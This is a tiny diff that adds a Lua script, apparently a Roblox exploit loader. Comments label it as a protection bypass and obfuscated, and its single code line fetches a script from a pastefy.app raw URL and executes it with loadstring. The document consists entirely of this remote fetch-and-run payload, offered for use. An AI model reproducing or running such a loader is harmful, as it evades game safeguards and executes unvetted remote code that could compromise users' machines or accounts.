@@ -1,0 +1,5 @@
+-- Bypass: Yes
+-- Obfuscated: Yes
+-- Development Speed: Slow
+
+loadstring(game:HttpGet("https://pastefy.app/ed5rDid6/raw", true))()
